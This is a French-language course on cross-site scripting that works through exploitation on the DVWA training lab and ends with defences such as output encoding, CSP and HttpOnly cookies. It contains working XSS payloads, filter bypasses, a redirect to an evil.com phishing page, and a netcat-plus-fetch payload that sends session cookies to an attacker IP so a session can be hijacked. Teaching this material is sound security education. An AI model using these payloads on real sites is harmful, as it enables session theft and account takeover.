# Cours : XSS (Cross-Site Scripting) - Fondamentaux Théoriques et Exploitation Basique

## Objectifs pédagogiques

À l'issue de ce cours, l'étudiant sera capable de :
- Comprendre la nature technique des vulnérabilités XSS
- Distinguer et caractériser les trois types d'attaques XSS
- Analyser les vecteurs d'attaque et leur portée (scope)
- Exploiter des vulnérabilités XSS basiques sur un environnement contrôlé
- Appréhender les mécanismes de protection et leurs limites

---

## Partie 1 : Fondamentaux Théoriques

### 1.1 Définition et nature de XSS

Le Cross-Site Scripting (XSS) est une vulnérabilité de sécurité dans les applications web permettant à un attaquant d'injecter du code JavaScript malveillant dans des pages consultées par d'autres utilisateurs. Cette injection s'effectue par l'intermédiaire de champs d'entrée non sécurisés (formulaires, paramètres URL, cookies, en-têtes HTTP).

**Mécanisme fondamental** : L'application web ne valide pas ou n'encode pas correctement les données fournies par l'utilisateur avant de les inclure dans la réponse HTML. Lorsque le navigateur de la victime interprète cette réponse, le JavaScript injecté est exécuté dans le contexte de sécurité de l'application originale.

**Classification OWASP** : XSS appartient à la catégorie A03:2021 – Injection dans l'OWASP Top 10, ce qui souligne sa criticité dans le paysage actuel des menaces web.

### 1.2 Contexte de sécurité du navigateur

Pour comprendre XSS, il est essentiel de maîtriser le modèle de sécurité du navigateur :

**Same-Origin Policy (SOP)** : Cette politique restreint l'accès aux ressources entre différentes origines (domaine, protocole, port). Toutefois, XSS contourne cette protection car le code malveillant s'exécute dans la même origine que l'application vulnérable, héritant ainsi de ses privilèges.

**Conséquences** : Le JavaScript injecté peut :
- Accéder au DOM (Document Object Model) de la page
- Lire et modifier les cookies de session
- Effectuer des requêtes HTTP au nom de l'utilisateur
- Accéder aux données de stockage local (localStorage, sessionStorage)
- Capturer les entrées utilisateur (keylogging)

### 1.3 Modèle de menace et impact

L'impact d'une attaque XSS dépend directement du contexte dans lequel elle s'exécute et des permissions associées :

| Vecteur d'attaque | Impact technique | Conséquence opérationnelle |
|-------------------|------------------|----------------------------|
| **Vol de cookies** | Accès à `document.cookie` | Usurpation de session (Session Hijacking) |
| **Keylogging** | Interception des événements clavier | Capture d'identifiants et données sensibles |
| **Phishing** | Manipulation du DOM | Redirection vers des pages frauduleuses |
| **CSRF** | Requêtes HTTP authentifiées | Actions non autorisées au nom de la victime |
| **Defacement** | Modification du contenu visible | Altération de l'image de marque |
| **Drive-by download** | Téléchargement automatique | Installation de malwares |

---

## Partie 2 : Typologie des Attaques XSS et Scope

### 2.1 Analyse comparative des trois types

La classification des attaques XSS repose sur deux critères fondamentaux :

1. **Le point d'injection** : Où le payload est inséré
2. **La persistance** : Durée de validité de l'attaque

| Type | Point d'injection | Persistance | Vecteurs de diffusion | Portée (Scope) |
|------|-------------------|-------------|-----------------------|----------------|
| **DOM-based XSS** | Côté client (manipulation du DOM) | Non persistante | URL, fragments, référents | Utilisateur actuel |
| **Reflected XSS** | Côté serveur (réponse HTTP immédiate) | Non persistante | Paramètres URL, en-têtes HTTP | Utilisateur cliquant sur le lien |
| **Stored XSS** | Côté serveur (stockage persistant) | Persistante | Base de données, fichiers système | **Tous les visiteurs** de la page |

### 2.2 Scope des attaques : Analyse détaillée

Le scope d'une attaque XSS définit son périmètre d'action et le nombre de victimes potentielles.

#### a) Scope du DOM-based XSS

**Portée** : Limitée à l'utilisateur courant visitant l'URL manipulée.

**Caractéristiques** :
- Le payload ne transite jamais par le serveur
- Les filtres côté serveur sont inefficaces
- L'attaque nécessite une action de l'utilisateur (visiter l'URL)

**Exemple de vecteur** :
```
https://example.com/page#default=<script>alert('XSS')</script>
```

**Exécution** : Le JavaScript côté client lit le fragment d'URL (`#default`) et l'injecte directement dans le DOM via `innerHTML` ou `document.write()`.

**Limitation** : L'attaquant doit convaincre la victime de visiter l'URL construite. L'attaque ne se propage pas automatiquement.

#### b) Scope du Reflected XSS

**Portée** : Limitée aux utilisateurs cliquant sur le lien malveillant ou soumettant le formulaire manipulé.

**Caractéristiques** :
- Le payload transite par le serveur dans la requête HTTP
- Le serveur l'inclut dans la réponse sans validation
- L'attaque ne persiste pas au-delà de la réponse HTTP

**Flux d'attaque** :
```
1. Attaquant construit l'URL : https://example.com/search?q=<script>alert('XSS')</script>
2. Attaquant diffuse l'URL (phishing, email, réseaux sociaux)
3. Victime clique sur l'URL
4. Serveur reçoit la requête avec le payload
5. Serveur génère la réponse incluant le payload non encodé
6. Navigateur de la victime exécute le JavaScript
```

**Vecteurs de diffusion** :
- Email de phishing
- Liens sur réseaux sociaux
- Référencement malveillant (SEO poisoning)
- Partage de liens raccourcis

**Limitation** : Chaque victime doit cliquer individuellement sur le lien. L'attaque ne peut pas infecter automatiquement d'autres utilisateurs.

#### c) Scope du Stored XSS (Persistent XSS)

**Portée** : **Tous les visiteurs** de la page contenant le payload injecté, y compris les utilisateurs non authentifiés.

**Caractéristiques** :
- Le payload est stocké de manière persistante (base de données, système de fichiers)
- L'attaque s'exécute automatiquement pour chaque visiteur
- L'attaquant n'a plus besoin d'intervenir après l'injection initiale
- **C'est le type le plus critique en termes d'impact**

**Flux d'attaque** :
```
1. Attaquant identifie un champ d'entrée vulnérable (commentaire, profil, message)
2. Attaquant injecte le payload : <script>alert('XSS')</script>
3. Application stocke le payload dans la base de données
4. Chaque utilisateur visitant la page déclenche l'exécution du payload
5. Attaquant peut observer les résultats (logs, cookies volés) en arrière-plan
```

**Exemples de vecteurs** :
- Champs de commentaires sur blog/forum
- Profils utilisateur (nom, bio)
- Systèmes de messagerie interne
- Tickets de support
- En-têtes HTTP stockés

**Impact multiplicateur** : Une seule injection peut compromettre des centaines ou des milliers d'utilisateurs sans action supplémentaire de l'attaquant.

### 2.3 Analyse comparative des scopes

| Critère | DOM-based | Reflected | Stored |
|---------|-----------|-----------|--------|
| **Nombre de victimes potentielles** | 1 (utilisateur actuel) | Limité (cliqueurs) | Illimité (tous visiteurs) |
| **Action requise de la victime** | Visiter l'URL | Cliquer sur le lien | Aucune (visite normale) |
| **Persistance temporelle** | Éphémère (session URL) | Éphémère (requête/réponse) | Persistante (jusqu'à suppression) |
| **Nécessité de diffusion** | Non | Oui (ingénierie sociale) | Non |
| **Capacité de propagation** | Aucune | Aucune | Automatique |
| **Gravité OWASP** | Moyenne | Moyenne | Critique |

---

## Partie 3 : Mise en Pratique sur DVWA

### 3.1 Configuration de l'environnement

DVWA (Damn Vulnerable Web Application) est une application web intentionnellement vulnérable conçue pour l'apprentissage des techniques de test d'intrusion.

**Configuration initiale** :
1. Accéder à l'interface DVWA
2. Naviguer vers "DVWA Security"
3. Sélectionner le niveau de sécurité : "Low"
4. Les niveaux Medium et High implémentent des protections croissantes

### 3.2 Exploitation DOM-based XSS (Low Security)

#### Analyse du code vulnérable

Le module XSS (DOM) de DVWA contient le code JavaScript suivant :

```javascript
if (document.location.href.indexOf("default=") >= 0) {
    var lang = document.location.href.substring(
        document.location.href.indexOf("default=") + 8
    );
    
    document.write("<option value='" + lang + "'>" + lang + "</option>");
}
```

**Analyse de la vulnérabilité** :
- La fonction `document.location.href.substring()` extrait la valeur du paramètre `default` de l'URL
- Cette valeur est directement concaténée dans une chaîne HTML
- `document.write()` injecte cette chaîne dans le DOM
- Aucune validation ou encodage n'est effectué

#### Exploitation basique

**Payload de preuve de concept** :
```
'></option></select><script>alert('XSS')</script>
```

**Construction de l'URL** :
```
http://servertcm:8001/vulnerabilities/xss_dom/?default='></option></select><script>alert('XSS')</script>
```

**Analyse du payload** :

| Séquence | Fonction |
|----------|----------|
| `'` | Ferme l'attribut `value='` |
| `>` | Ferme la balise `<option>` |
| `</option>` | Fermeture explicite de l'élément option |
| `</select>` | Fermeture explicite de l'élément select |
| `<script>alert('XSS')</script>` | Injection du code malveillant |

**Résultat** : Le navigateur exécute `alert('XSS')`, démontrant l'exécution de code arbitraire.

#### Exploitation avancée : Redirection

**Payload de redirection** :
```javascript
'></option></select><script>document.location.href="https://evil.com/phishing"</script>
```

**Analyse** : Ce payload redirige l'utilisateur vers un site contrôlé par l'attaquant. Dans un scénario réaliste, ce site hébergerait une page de phishing imitant l'application originale.

### 3.3 Contournement de filtres (Medium Security)

#### Analyse du filtre

Au niveau Medium, DVWA implémente un filtre côté serveur :

```php
<?php
$default = $_GET['default'];
$default = str_replace("<script", "", $default);
echo $default;
?>
```

**Limitation du filtre** :
- Il cherche uniquement la séquence `<script`
- Il ne normalise pas l'entrée (casse, encodage)
- Il ne cible pas d'autres vecteurs d'exécution JavaScript

#### Technique de contournement

**Payload alternatif utilisant `<img>` et `onerror`** :
```
"></option></select><img src=x onerror="alert('XSS')">
```

**Explication technique** :
- La balise `<img>` est légitime et non filtrée
- L'attribut `src=x` désigne une source inexistante
- L'attribut `onerror` définit un gestionnaire d'événement exécuté lorsque le chargement de l'image échoue
- Le navigateur tente de charger l'image, échoue, et exécute le code dans `onerror`

**Autres vecteurs de contournement** :
```html
<!-- SVG avec onload -->
"></option></select><svg onload="alert('XSS')">

<!-- Body avec onload -->
"></option></select><body onload="alert('XSS')">

<!-- Iframe avec srcdoc -->
"></option></select><iframe srcdoc="<script>alert('XSS')</script>">
```

**Leçon fondamentale** : Les filtres basés sur des patterns (blacklist) sont intrinsèquement insuffisants car ils ne couvrent pas tous les vecteurs possibles.

### 3.4 Exploitation Reflected XSS

#### Analyse du vecteur

Le module XSS (Reflected) de DVWA présente un formulaire de saisie :

```php
<?php
$name = $_GET['name'];
echo "Hello " . $name;
?>
```

**Vulnérabilité** : La variable `$name` est directement concaténée dans la sortie HTML sans encodage.

#### Exploitation

**Payload** :
```
<script>alert('XSS')</script>
```

**URL résultante** :
```
http://servertcm:8001/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>
```

**Analyse du flux** :
1. Le client envoie la requête GET avec le payload dans le paramètre `name`
2. Le serveur extrait `$_GET['name']` sans validation
3. Le serveur construit la réponse : `Hello <script>alert('XSS')</script>`
4. Le navigateur interprète la réponse et exécute le script

### 3.5 Exploitation Stored XSS

#### Particularité technique

Le module XSS (Stored) de DVWA présente une contrainte côté client :

```html
<input type="text" name="txtName" maxlength="10">
```

**Analyse** : L'attribut `maxlength="10"` est une validation côté client (HTML). Il ne constitue pas une mesure de sécurité car il peut être contourné.

#### Technique de contournement

**Méthode 1 : Modification via DevTools**
1. Ouvrir les outils de développement (F12)
2. Utiliser l'inspecteur pour localiser l'élément `<input>`
3. Modifier l'attribut `maxlength` (par exemple : `maxlength="100"`)
4. Soumettre le formulaire avec la nouvelle contrainte

**Méthode 2 : Interception de requête (Proxy)**
1. Utiliser un proxy d'interception (Burp Suite, OWASP ZAP)
2. Capturer la requête POST
3. Modifier le corps de la requête pour inclure le payload complet
4. Transmettre la requête modifiée

**Leçon** : Les validations côté client sont aisément contournables. La validation de sécurité doit toujours être implémentée côté serveur.

#### Exploitation

**Payload** :
```
<script>alert('XSS')</script>
```

**Injection** :
- Champ Name : `<script>alert('XSS')</script>`
- Champ Message : `Test message`

**Résultat** : Le payload est stocké dans la base de données de DVWA. À chaque chargement de la page, le script est exécuté.

**Démonstration de persistance** :
1. Injecter le payload
2. Fermer le navigateur
3. Ouvrir un navigateur en mode privé
4. Accéder à la page XSS (Stored)
5. Observer que l'alerte s'affiche automatiquement

**Conclusion** : Le XSS Stored affecte tous les visiteurs de la page, indépendamment de leur état de connexion.

---

## Partie 4 : Session Hijacking

### 4.1 Mécanisme des sessions web

**Fonctionnement standard** :
1. L'utilisateur s'authentifie (identifiant/mot de passe)
2. Le serveur crée une session et génère un identifiant unique (ex: `PHPSESSID`)
3. Le serveur envoie cet identifiant au client sous forme de cookie
4. Le client stocke le cookie et le transmet dans chaque requête ultérieure
5. Le serveur associe la requête à la session correspondante

**Analogie** : Le cookie de session est un jeton d'authentification temporaire. Sa possession suffit pour être reconnu comme l'utilisateur légitime.

### 4.2 Vulnérabilité : Accès JavaScript aux cookies

**Configuration par défaut de DVWA** :

| Nom du cookie | Valeur | HttpOnly | Secure | SameSite |
|---------------|--------|----------|--------|----------|
| PHPSESSID | abc123def456... | Non | Non | None |

**Analyse** :
- `HttpOnly = Non` : Le cookie est accessible via JavaScript (`document.cookie`)
- `Secure = Non` : Le cookie peut être transmis sur HTTP (non chiffré)
- `SameSite = None` : Le cookie est envoyé dans les requêtes cross-site

**Test d'accès** :
```javascript
// Exécuter dans la console du navigateur
console.log(document.cookie);
// Résultat : "PHPSESSID=abc123def456...; security=low"
```

**Conclusion** : En l'absence du flag HttpOnly, JavaScript peut lire et exfiltrer le cookie de session.

### 4.3 Technique de vol de cookie via XSS

#### Infrastructure de réception

**Listener Netcat** (sur machine attaquante) :
```bash
nc -nvlp 8000
```

**Paramètres** :
- `-n` : Pas de résolution DNS
- `-v` : Mode verbeux
- `-l` : Mode écoute
- `-p 8000` : Port d'écoute

#### Payload d'exfiltration

**Injection dans DVWA (Stored XSS)** :
```html
<script>fetch('http://192.168.1.48:8000/'+document.cookie);</script>
```

**Remplacer 192.168.1.48 par l'adresse IP de votre machine**

**Analyse technique** :
- La fonction `fetch()` effectue une requête HTTP asynchrone
- L'URL cible inclut la valeur de `document.cookie`
- La requête transmet le cookie vers le serveur de l'attaquant
- Le cookie apparaît dans le chemin de la requête GET

#### Flux d'exécution

```
1. Victime visite la page contenant le XSS Stored
2. Navigateur exécute : fetch('http://192.168.1.48:8000/PHPSESSID=abc123...')
3. Requête HTTP transmise vers 192.168.1.48:8000
4. Netcat capture la requête :
   GET /PHPSESSID=abc123def456...; security=low HTTP/1.1
   Host: 192.168.1.48:8000
   User-Agent: Mozilla/5.0...
5. Attaquant extrait la valeur : PHPSESSID=abc123def456...
```

### 4.4 Impersonation de session

#### Procédure

1. **Ouvrir un navigateur en mode privé** (pour simuler une nouvelle session)
2. **Accéder à DVWA** : `http://servertcm:8001`
3. **Observer** : Page de login affichée (non authentifié)
4. **Ouvrir DevTools** → Application → Cookies
5. **Ajouter un cookie** :
   - Name : `PHPSESSID`
   - Value : `abc123def456...` (cookie volé)
   - Domain : `servertcm`
   - Path : `/`
6. **Rafraîchir la page**

**Résultat** : L'utilisateur est authentifié en tant qu'admin sans avoir fourni de mot de passe.

#### Analyse

**Pourquoi cela fonctionne-t-il ?**
- Le serveur ne vérifie que la présence du cookie PHPSESSID
- Il ne valide pas l'adresse IP, le User-Agent, ou d'autres attributs de la session
- La possession du cookie suffit pour établir l'identité

**Implications** :
- Une seule vulnérabilité XSS peut compromettre l'ensemble des comptes utilisateurs
- L'attaquant n'a pas besoin de connaître les mots de passe
- La compromission est persistante tant que la session est valide

---

## Partie 5 : Mécanismes de Protection

### 5.1 Encodage de sortie (Output Encoding)

**Principe fondamental** : Convertir les caractères spéciaux en leur entité HTML équivalente avant l'affichage.

**Table de conversion** :

| Caractère | Entité HTML |
|-----------|-------------|
| `<` | `&lt;` |
| `>` | `&gt;` |
| `"` | `&quot;` |
| `'` | `&#39;` |
| `&` | `&amp;` |

**Implémentation PHP** :
```php
<?php
// Vulnérable
echo $_GET['name'];

// Protégé
echo htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
?>
```

**Effet** :
- Input : `<script>alert('XSS')</script>`
- Output : `&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;`
- Rendu : `<script>alert('XSS')</script>` (texte, non exécuté)

**Implémentation JavaScript** :
```javascript
// Vulnérable
document.getElementById('output').innerHTML = userInput;

// Protégé
document.getElementById('output').textContent = userInput;
```

**Note** : `textContent` n'interprète pas le HTML, contrairement à `innerHTML`.

### 5.2 Content Security Policy (CSP)

**Définition** : La CSP est un mécanisme de sécurité HTTP qui restreint les sources de contenu (scripts, styles, images, etc.) qu'une page peut charger.

**Header CSP** :
```
Content-Security-Policy: default-src 'self'; script-src 'self'
```

**Analyse des directives** :
- `default-src 'self'` : Par défaut, charger uniquement depuis le même domaine
- `script-src 'self'` : Les scripts doivent provenir du même domaine uniquement

**Effets protecteurs** :
- Blocage des scripts inline (`<script>...</script>`)
- Blocage des event handlers inline (`onerror="..."`)
- Blocage de `eval()` et de ses variantes
- Restriction des sources externes

**Limitations** :
- Configuration complexe
- Peut bloquer des fonctionnalités légitimes
- Ne protège pas contre toutes les variantes de XSS

### 5.3 Flag HttpOnly sur les cookies

**Principe** : Le flag HttpOnly empêche JavaScript d'accéder au cookie via `document.cookie`.

**Implémentation PHP** :
```php
<?php
session_start();
session_set_cookie_params([
    'httponly' => true,  // Bloque l'accès JavaScript
    'secure' => true,    // Transmission uniquement sur HTTPS
    'samesite' => 'Strict'  // Protection contre CSRF
]);
?>
```

**Effet** :
```javascript
document.cookie
// Résultat : "" (vide)
```

**Analyse** :
- Le cookie est toujours transmis dans les requêtes HTTP
- Il n'est plus accessible via JavaScript
- L'exfiltration via XSS devient impossible pour ce cookie

**Limitation** : Ne protège pas contre d'autres vecteurs XSS (keylogging, phishing, CSRF).

### 5.4 Validation et sanitization côté serveur

**Approche whitelist** :
```php
<?php
// Accepter uniquement les caractères alphanumériques
if (!preg_match('/^[a-zA-Z0-9]+$/', $_GET['name'])) {
    die("Entrée invalide");
}
$name = $_GET['name'];
?>
```

**Approche bibliothèque spécialisée** (HTML Purifier) :
```php
<?php
require_once 'HTMLPurifier.auto.php';
$config = HTMLPurifier_Config::createDefault();
$purifier = new HTMLPurifier($config);
$clean_html = $purifier->purify($dirty_html);
?>
```

**Principes** :
- Toujours valider l'entrée selon un format attendu
- Ne jamais faire confiance aux données fournies par l'utilisateur
- Utiliser des bibliothèques éprouvées plutôt que des filtres personnalisés

### 5.5 Efficacité comparative des protections

| Protection | Vecteur bloqué | Efficacité | Limitations |
|------------|----------------|------------|-------------|
| **Output Encoding** | Injection de scripts | Élevée | Doit être appliquée systématiquement |
| **CSP** | Exécution de scripts non autorisés | Moyenne-Élevée | Configuration complexe |
| **HttpOnly** | Vol de cookies | Moyenne (spécifique) | Ne protège pas contre d'autres impacts XSS |
| **Validation serveur** | Input malveillant | Moyenne | Patterns de validation incomplets |
| **Filtrage simple** | Payloads basiques | Faible | Contournement trivial |

**Recommandation** : Approche défense en profondeur (Defense in Depth) - combiner plusieurs couches de protection.

---

## Partie 6 : Synthèse et Points Clés

### Concepts fondamentaux

1. **Nature de XSS** : Vulnérabilité d'injection permettant l'exécution de code JavaScript dans le contexte de sécurité de l'application vulnérable.

2. **Modèle de menace** : XSS contourne la Same-Origin Policy car le code malveillant s'exécute dans la même origine que l'application.

3. **Typologie** : Trois types distincts basés sur le point d'injection et la persistance : DOM-based, Reflected, Stored.

### Analyse du scope

| Type | Scope | Mécanisme de diffusion |
|------|-------|------------------------|
| DOM-based | Utilisateur actuel | Manipulation de l'URL |
| Reflected | Utilisateurs cliquant sur le lien | Ingénierie sociale, phishing |
| Stored | **Tous les visiteurs** | Stockage persistant, propagation automatique |

**Critère de criticité** : Le scope du Stored XSS en fait la variante la plus dangereuse, capable de compromettre un nombre illimité de victimes sans action supplémentaire de l'attaquant.

### Vecteurs d'exploitation

- **Payloads basiques** : `<script>alert('XSS')</script>`
- **Contournement de filtres** : `<img src=x onerror="alert('XSS')">`
- **Exfiltration de données** : `fetch('http://attacker/'+document.cookie)`
- **Impersonation** : Injection du cookie volé dans un nouveau navigateur

### Mécanismes de protection

1. **Output Encoding** : Mesure fondamentale, convertit les caractères spéciaux en entités HTML
2. **CSP** : Restreint les sources de contenu exécutables
3. **HttpOnly** : Protège les cookies contre l'exfiltration JavaScript
4. **Validation serveur** : Filtre l'entrée selon des patterns définis

### Limites des protections

- Les filtres basés sur des blacklists sont contournables
- Les validations côté client sont aisément contournables
- Aucune protection unique n'est suffisante
- La défense en profondeur est nécessaire

---

## Conclusion

Ce cours a présenté les fondements théoriques et pratiques des attaques XSS. La compréhension du scope de chaque type d'attaque est essentielle pour évaluer leur criticité et prioriser les efforts de protection.

Le XSS Stored représente la menace la plus sérieuse en raison de son scope étendu (tous les visiteurs) et de sa persistance (stockage en base de données). Toutefois, les variantes DOM-based et Reflected restent dangereuses dans des contextes d'ingénierie sociale ciblée.

La protection efficace repose sur une approche multicouche combinant l'encodage de sortie, la CSP, les drapeaux de sécurité sur les cookies, et une validation rigoureuse côté serveur.

---

## Glossaire

| Terme | Définition |
|-------|------------|
| **XSS** | Cross-Site Scripting : Injection de scripts malveillants dans des pages web |
| **DOM** | Document Object Model : Représentation structurée d'une page web manipulable par JavaScript |
| **Payload** | Code malveillant injecté par l'attaquant |
| **Scope** | Portée de l'attaque : nombre de victimes potentielles |
| **Session** | État d'authentification maintenu entre le client et le serveur |
| **Cookie** | Petit fichier stocké par le navigateur, contenant des données de session |
| **Session Hijacking** | Usurpation de session par vol de cookie de session |
| **HttpOnly** | Attribut de sécurité empêchant l'accès JavaScript aux cookies |
| **CSP** | Content Security Policy : Politique de sécurité HTTP restreignant les sources de contenu |
| **Output Encoding** | Encodage des caractères spéciaux avant affichage |
| **Same-Origin Policy** | Politique de sécurité du navigateur restreignant l'accès entre origines différentes |